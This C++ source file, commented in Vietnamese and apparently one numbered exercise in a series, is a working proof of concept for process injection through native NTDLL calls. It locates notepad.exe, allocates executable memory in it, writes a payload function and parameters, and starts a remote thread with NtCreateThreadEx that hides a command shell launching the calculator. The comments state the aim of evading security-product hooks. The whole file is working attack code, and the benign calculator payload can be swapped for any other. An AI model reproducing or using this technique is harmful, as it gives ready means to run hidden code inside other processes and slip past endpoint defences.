#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa chuẩn xác nguyên mẫu các hàm Native API (Undocumented), dùng PVOID để giữ phẳng sạch dependencies
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm trực tiếp thông qua Native API
DWORD WINAPI RemoteNtApiPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, né hoàn toàn hàng rào địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &pe32));
    }
    CloseHandle(snapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 23: NATIVE API (NTDLL) INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // 2. Nạp động thư viện cốt lõi ntdll.dll để phân giải hàm Native
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return EXIT_FAILURE;

    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // 3. Mở Handle kết nối xuyên biên giới quyền hạn cao
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // 4. Áp dụng quy trình Cấp phát động thích ứng (Zero Static Buffers) vừa khít từng phân đoạn
    SIZE_T functionSize = 500;
    PVOID remoteCodeBuffer = NULL;

    // Gọi Native API cấp phát vùng nhớ thực thi từ xa cho mã máy
    NtAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Cấp phát phân vùng dữ liệu tham số tuyệt đối chéo biên giới mang quyền RW
    SIZE_T dataSize = sizeof(THREAD_DATA);
    PVOID remoteDataBuffer = NULL;
    NtAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] NtAllocateVirtualMemory that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX thiet lap tu xa tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // 5. Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Ghi mã máy hàm độc lập vị trí và cấu trúc tham số sang RAM Notepad bằng Native API
    SIZE_T bytesWritten = 0;
    NtWriteVirtualMemory(hProcess, remoteCodeBuffer, (PVOID)RemoteNtApiPayload, functionSize, &bytesWritten);
    NtWriteVirtualMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
    std::cout << "[+] Anh xa logic ham va cau truc tham so qua song song hoan tat." << std::endl;

    // 6. Kích nổ Thread chạy từ xa xuyên qua mọi tầng hook Win32 của giải pháp bảo mật
    std::cout << "[*] Dang khoi tao luong tu xa NtCreateThreadEx de khai hoa..." << std::endl;
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // Cấu hình cờ đợi INFINITE gánh luồng sống an toàn
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] NTAPI Injection executed successfully inside Target!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx failed! Error code: " << GetLastError() << std::endl;
    }

    // Thu hồi tài nguyên sạch sẽ chống rò rỉ tài nguyên hệ thống
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}